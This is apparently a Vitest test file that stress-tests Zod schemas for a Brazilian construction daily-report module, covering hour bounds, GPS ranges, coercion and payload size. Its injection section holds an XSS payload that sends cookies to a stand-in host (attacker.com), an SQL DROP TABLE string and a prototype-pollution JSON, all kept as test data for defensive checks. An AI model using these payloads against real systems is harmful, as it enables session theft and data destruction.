import { describe, it, expect } from 'vitest';
import {
  WeatherEntrySchema,
  LaborEntrySchema,
  EquipmentEntrySchema,
  ActivityEntrySchema,
  MaterialEntrySchema,
  OccurrenceEntrySchema,
  PhotoUploadMetadataSchema,
  CreateRDOSchema,
  SubmitRDOSchema,
  ReturnRDOSchema,
  AuditedEditSchema,
} from '../../src/modules/rdo/rdo.dto.js';

describe('Adversarial Zod DTO Fuzzing & Boundary Stress Tests', () => {
  // --------------------------------------------------------------------------
  // 1. Negative Numbers and Bound Invariants
  // --------------------------------------------------------------------------
  describe('1. Negative Hours, Zero Bounds and Number Invariants', () => {
    it('rejects negative stoppageHours in WeatherEntrySchema', () => {
      expect(() =>
        WeatherEntrySchema.parse({
          shift: 'manha',
          condition: 'Ensolarado',
          stoppageHours: -0.01,
        }),
      ).toThrowError(/Horas de paralisação não podem ser negativas/);

      expect(() =>
        WeatherEntrySchema.parse({
          shift: 'manha',
          condition: 'Ensolarado',
          stoppageHours: -5,
        }),
      ).toThrowError(/Horas de paralisação não podem ser negativas/);
    });

    it('rejects stoppageHours > 24 in WeatherEntrySchema', () => {
      expect(() =>
        WeatherEntrySchema.parse({
          shift: 'manha',
          condition: 'Ensolarado',
          stoppageHours: 24.1,
        }),
      ).toThrowError(/Horas de paralisação não podem exceder 24h/);
    });

    it('rejects negative or zero labor hours and quantity in LaborEntrySchema', () => {
      expect(() =>
        LaborEntrySchema.parse({ role: 'Pedreiro', quantity: 0, hours: 8 }),
      ).toThrowError(/Quantidade de operários deve ser maior que zero/);

      expect(() =>
        LaborEntrySchema.parse({ role: 'Pedreiro', quantity: -3, hours: 8 }),
      ).toThrowError(/Quantidade de operários deve ser maior que zero/);

      expect(() =>
        LaborEntrySchema.parse({ role: 'Pedreiro', quantity: 2, hours: 0 }),
      ).toThrowError(/Horas trabalhadas devem ser maiores que zero/);

      expect(() =>
        LaborEntrySchema.parse({ role: 'Pedreiro', quantity: 2, hours: -1 }),
      ).toThrowError(/Horas trabalhadas devem ser maiores que zero/);

      expect(() =>
        LaborEntrySchema.parse({ role: 'Pedreiro', quantity: 2, hours: 24.5 }),
      ).toThrowError(/Jornada não pode exceder 24 horas/);
    });

    it('rejects fractional worker quantity in LaborEntrySchema', () => {
      expect(() =>
        LaborEntrySchema.parse({ role: 'Eletricista', quantity: 2.7, hours: 8 }),
      ).toThrowError(/número inteiro/);
    });

    it('rejects negative activeHours and idleHours in EquipmentEntrySchema', () => {
      expect(() =>
        EquipmentEntrySchema.parse({
          name: 'Retroescavadeira',
          activeHours: -1,
          idleHours: 0,
        }),
      ).toThrowError(/Horas ativas não podem ser negativas/);

      expect(() =>
        EquipmentEntrySchema.parse({
          name: 'Retroescavadeira',
          activeHours: 4,
          idleHours: -0.5,
        }),
      ).toThrowError(/Horas ociosas não podem ser negativas/);
    });

    it('rejects activeHours + idleHours exceeding 24h in EquipmentEntrySchema', () => {
      expect(() =>
        EquipmentEntrySchema.parse({
          name: 'Guindaste',
          activeHours: 14,
          idleHours: 11,
          idleJustification: 'Manutenção corretiva',
        }),
      ).toThrowError(/A soma de horas ativas e horas ociosas não pode exceder 24 horas/);
    });

    it('rejects negative activity progress and progress > 100 in ActivityEntrySchema', () => {
      expect(() =>
        ActivityEntrySchema.parse({
          description: 'Alvenaria de vedação',
          location: 'Pavimento 2',
          unit: 'm²',
          quantity: 50,
          progress: -1,
        }),
      ).toThrowError(/Avanço físico mínimo é 0%/);

      expect(() =>
        ActivityEntrySchema.parse({
          description: 'Alvenaria de vedação',
          location: 'Pavimento 2',
          unit: 'm²',
          quantity: 50,
          progress: 100.01,
        }),
      ).toThrowError(/Avanço físico máximo é 100%/);
    });
  });

  // --------------------------------------------------------------------------
  // 2. Non-Numeric Strings and Type Coercion Fuzzing
  // --------------------------------------------------------------------------
  describe('2. Non-Numeric Strings, NaN and Type Mismatches', () => {
    it('rejects non-numeric string representations where strict number is expected', () => {
      expect(() =>
        WeatherEntrySchema.parse({
          shift: 'manha',
          condition: 'Ensolarado',
          stoppageHours: 'oito',
        }),
      ).toThrow();

      expect(() =>
        LaborEntrySchema.parse({
          role: 'Carpinteiro',
          quantity: 'cinco',
          hours: 8,
        }),
      ).toThrow();

      expect(() =>
        LaborEntrySchema.parse({
          role: 'Carpinteiro',
          quantity: 2,
          hours: 'oito',
        }),
      ).toThrow();

      expect(() =>
        EquipmentEntrySchema.parse({
          name: 'Compactador',
          activeHours: 'NaN',
          idleHours: 0,
        }),
      ).toThrow();

      expect(() =>
        ActivityEntrySchema.parse({
          description: 'Pintura',
          location: 'Fachada',
          unit: 'm²',
          quantity: 'muito',
        }),
      ).toThrow();
    });

    it('rejects NaN, Infinity and -Infinity in number fields', () => {
      expect(() =>
        EquipmentEntrySchema.parse({
          name: 'Compressor',
          activeHours: NaN,
          idleHours: 0,
        }),
      ).toThrow();

      expect(() =>
        EquipmentEntrySchema.parse({
          name: 'Compressor',
          activeHours: Infinity,
          idleHours: 0,
        }),
      ).toThrow();

      expect(() =>
        EquipmentEntrySchema.parse({
          name: 'Compressor',
          activeHours: 8,
          idleHours: -Infinity,
        }),
      ).toThrow();
    });
  });

  // --------------------------------------------------------------------------
  // 3. Equipment Idle Hours and Mandatory Justifications
  // --------------------------------------------------------------------------
  describe('3. Idle Hours Justification Invariant Verification', () => {
    it('rejects missing idleJustification when idleHours > 0', () => {
      expect(() =>
        EquipmentEntrySchema.parse({
          name: 'Caminhão Munck',
          activeHours: 4,
          idleHours: 4,
        }),
      ).toThrowError(/Justificativa de ociosidade é obrigatória/);
    });

    it('rejects empty or whitespace-only idleJustification when idleHours > 0', () => {
      expect(() =>
        EquipmentEntrySchema.parse({
          name: 'Caminhão Munck',
          activeHours: 4,
          idleHours: 2,
          idleJustification: '     ',
        }),
      ).toThrowError(/Justificativa de ociosidade é obrigatória/);
    });

    it('rejects short idleJustification (< 5 chars) when idleHours > 0', () => {
      expect(() =>
        EquipmentEntrySchema.parse({
          name: 'Caminhão Munck',
          activeHours: 4,
          idleHours: 2,
          idleJustification: 'Queb',
        }),
      ).toThrowError(/mínimo 5 caracteres/);
    });

    it('accepts valid idleJustification (>= 5 chars) when idleHours > 0', () => {
      const parsed = EquipmentEntrySchema.parse({
        name: 'Caminhão Munck',
        activeHours: 4,
        idleHours: 2,
        idleJustification: 'Aguardando liberação de área pela fiscalização',
      });
      expect(parsed.idleJustification).toBe('Aguardando liberação de área pela fiscalização');
    });

    it('allows idleJustification to be omitted when idleHours === 0', () => {
      const parsed = EquipmentEntrySchema.parse({
        name: 'Caminhão Munck',
        activeHours: 8,
        idleHours: 0,
      });
      expect(parsed.idleJustification).toBeUndefined();
    });
  });

  // --------------------------------------------------------------------------
  // 4. GPS Coordinate Bounds and Photo Metadata Coercion
  // --------------------------------------------------------------------------
  describe('4. GPS Coordinate Boundary & Precision Stress Tests', () => {
    const validBasePhoto = {
      caption: 'Armação dos pilares P1 a P4',
      workId: 'a3fa51e2-b36c-4861-8ee4-ea0be2d62734',
      takenAt: '2026-10-29T14:30:00.000Z',
      latitude: -2.5307,
      longitude: -44.3068,
      accuracy: 3.2,
      watermarkText: 'OBRA STACKLAB - 29/10/2026 14:30 - GPS: -2.5307, -44.3068',
    };

    it('accepts extreme but valid boundary coordinates (-90, 90, -180, 180, accuracy 0)', () => {
      const southPole = PhotoUploadMetadataSchema.parse({
        ...validBasePhoto,
        latitude: -90,
        longitude: -180,
        accuracy: 0,
      });
      expect(southPole.latitude).toBe(-90);
      expect(southPole.longitude).toBe(-180);
      expect(southPole.accuracy).toBe(0);

      const northPole = PhotoUploadMetadataSchema.parse({
        ...validBasePhoto,
        latitude: 90,
        longitude: 180,
      });
      expect(northPole.latitude).toBe(90);
      expect(northPole.longitude).toBe(180);
    });

    it('rejects latitude > 90 and latitude < -90', () => {
      expect(() =>
        PhotoUploadMetadataSchema.parse({
          ...validBasePhoto,
          latitude: 90.000001,
        }),
      ).toThrowError(/Latitude deve estar entre -90 e 90 graus/);

      expect(() =>
        PhotoUploadMetadataSchema.parse({
          ...validBasePhoto,
          latitude: -90.000001,
        }),
      ).toThrowError(/Latitude deve estar entre -90 e 90 graus/);

      expect(() =>
        PhotoUploadMetadataSchema.parse({
          ...validBasePhoto,
          latitude: 180,
        }),
      ).toThrowError(/Latitude deve estar entre -90 e 90 graus/);
    });

    it('rejects longitude > 180 and longitude < -180', () => {
      expect(() =>
        PhotoUploadMetadataSchema.parse({
          ...validBasePhoto,
          longitude: 180.000001,
        }),
      ).toThrowError(/Longitude deve estar entre -180 e 180 graus/);

      expect(() =>
        PhotoUploadMetadataSchema.parse({
          ...validBasePhoto,
          longitude: -180.000001,
        }),
      ).toThrowError(/Longitude deve estar entre -180 e 180 graus/);

      expect(() =>
        PhotoUploadMetadataSchema.parse({
          ...validBasePhoto,
          longitude: 360,
        }),
      ).toThrowError(/Longitude deve estar entre -180 e 180 graus/);
    });

    it('rejects negative GPS accuracy', () => {
      expect(() =>
        PhotoUploadMetadataSchema.parse({
          ...validBasePhoto,
          accuracy: -0.01,
        }),
      ).toThrowError(/Precisão do GPS não pode ser negativa/);

      expect(() =>
        PhotoUploadMetadataSchema.parse({
          ...validBasePhoto,
          accuracy: -10,
        }),
      ).toThrowError(/Precisão do GPS não pode ser negativa/);
    });

    it('correctly coerces numeric strings from multipart form data', () => {
      const parsed = PhotoUploadMetadataSchema.parse({
        ...validBasePhoto,
        latitude: '-2.5307',
        longitude: '-44.3068',
        accuracy: '4.5',
      });
      expect(parsed.latitude).toBe(-2.5307);
      expect(parsed.longitude).toBe(-44.3068);
      expect(parsed.accuracy).toBe(4.5);
    });

    it('rejects non-numeric string values during coercion', () => {
      expect(() =>
        PhotoUploadMetadataSchema.parse({
          ...validBasePhoto,
          latitude: 'not-a-latitude',
        }),
      ).toThrow();

      expect(() =>
        PhotoUploadMetadataSchema.parse({
          ...validBasePhoto,
          longitude: 'invalid-longitude',
        }),
      ).toThrow();

      expect(() =>
        PhotoUploadMetadataSchema.parse({
          ...validBasePhoto,
          accuracy: 'abc',
        }),
      ).toThrow();
    });

    it('rejects invalid ISO 8601 datetime strings', () => {
      expect(() =>
        PhotoUploadMetadataSchema.parse({
          ...validBasePhoto,
          takenAt: '2026-10-29 14:30:00', // Missing 'T' and 'Z'
        }),
      ).toThrowError(/Data\/hora de captura deve estar no formato ISO 8601/);

      expect(() =>
        PhotoUploadMetadataSchema.parse({
          ...validBasePhoto,
          takenAt: 'ontem às 14h',
        }),
      ).toThrowError(/Data\/hora de captura deve estar no formato ISO 8601/);
    });
  });

  // --------------------------------------------------------------------------
  // 5. Injection Resilience (SQLi, XSS, Script tags in text fields)
  // --------------------------------------------------------------------------
  describe('5. Injection Payloads and String Sanitization Boundaries', () => {
    it('safely parses strings containing XSS vectors without execution or prototype alteration', () => {
      const xssPayload = `<script>alert('xss')</script><img src=x onerror="fetch('http://attacker.com?c='+document.cookie)">`;
      const parsed = ActivityEntrySchema.parse({
        description: xssPayload,
        location: 'Bloco A',
        unit: 'm²',
        quantity: 10,
      });

      expect(parsed.description).toBe(xssPayload);
      expect((parsed as any).polluted).toBeUndefined();
    });

    it('safely parses strings containing SQL injection attempts', () => {
      const sqliPayload = `'; DROP TABLE "RDO"; SELECT * FROM "User" WHERE '1'='1`;
      const parsed = OccurrenceEntrySchema.parse({
        type: 'outro',
        description: sqliPayload,
      });

      expect(parsed.description).toBe(sqliPayload);
    });

    it('rejects strings that become empty after trimming whitespace', () => {
      expect(() =>
        ActivityEntrySchema.parse({
          description: '      ',
          location: 'Bloco A',
          unit: 'm²',
          quantity: 10,
        }),
      ).toThrowError(/Descrição da atividade é obrigatória/);

      expect(() =>
        OccurrenceEntrySchema.parse({
          type: 'dds',
          description: ' \n\t  ',
        }),
      ).toThrowError(/Descrição da ocorrência é obrigatória/);
    });
  });

  // --------------------------------------------------------------------------
  // 6. Deeply Nested, Oversized and Adversarial Payloads
  // --------------------------------------------------------------------------
  describe('6. Oversized and Adversarial Payloads', () => {
    it('handles payload with 500 labor entries and computes headcount accurately', () => {
      const massiveLabor = Array.from({ length: 500 }, (_, i) => ({
        role: `Função Especializada #${i}`,
        quantity: 2,
        hours: 8,
      }));

      const payload = {
        workId: 'a3fa51e2-b36c-4861-8ee4-ea0be2d62734',
        date: '2026-10-29',
        weather: [{ shift: 'manha' as const, condition: 'Ensolarado' }],
        labor: massiveLabor,
        activities: [
          {
            description: 'Concretagem geral',
            location: 'Fundação',
            unit: 'm³',
            quantity: 120,
          },
        ],
      };

      const parsed = SubmitRDOSchema.parse(payload);
      expect(parsed.labor.length).toBe(500);
      const totalWorkers = parsed.labor.reduce((sum, item) => sum + item.quantity, 0);
      expect(totalWorkers).toBe(1000);
    });

    it('rejects SubmitRDOSchema when total headcount is 0 despite non-empty labor', () => {
      // LaborEntrySchema requires quantity positive, but let's test if someone bypasses or tries edge quantities
      expect(() =>
        SubmitRDOSchema.parse({
          workId: 'a3fa51e2-b36c-4861-8ee4-ea0be2d62734',
          date: '2026-10-29',
          weather: [{ shift: 'manha', condition: 'Ensolarado' }],
          labor: [],
          activities: [
            {
              description: 'Atividade',
              location: 'Térreo',
              unit: 'un',
              quantity: 1,
            },
          ],
        }),
      ).toThrowError(/Ao menos uma equipe\/função de mão de obra deve ser informada/);
    });

    it('rejects prototype pollution payload attempts', () => {
      const maliciousJson = JSON.parse(
        '{"workId":"a3fa51e2-b36c-4861-8ee4-ea0be2d62734","date":"2026-10-29","__proto__":{"admin":true}}',
      );

      const parsed = CreateRDOSchema.parse(maliciousJson);
      expect((parsed as any).admin).toBeUndefined();
      expect((Object.prototype as any).admin).toBeUndefined();
    });
  });

  // --------------------------------------------------------------------------
  // 7. Master Action Contracts (Audited Edit & Return)
  // --------------------------------------------------------------------------
  describe('7. Master Profile Invariant Checks', () => {
    it('rejects AuditedEdit when newValue is identical to previousValue', () => {
      expect(() =>
        AuditedEditSchema.parse({
          section: 'equipamentos',
          field: 'activeHours',
          previousValue: '6',
          newValue: '6',
          justification: 'Tentando salvar sem alteração',
        }),
      ).toThrowError(/O novo valor deve ser diferente do valor anterior/);
    });

    it('rejects ReturnRDO when returnReason is less than 10 characters', () => {
      expect(() =>
        ReturnRDOSchema.parse({
          reason: 'Errado',
        }),
      ).toThrowError(/A justificativa de devolução deve ter no mínimo 10 caracteres/);
    });

    it('accepts ReturnRDO when returnReason has 10+ characters', () => {
      const parsed = ReturnRDOSchema.parse({
        reason: 'Fotos sem marca d água legível',
      });
      expect(parsed.reason).toBe('Fotos sem marca d água legível');
    });
  });
});
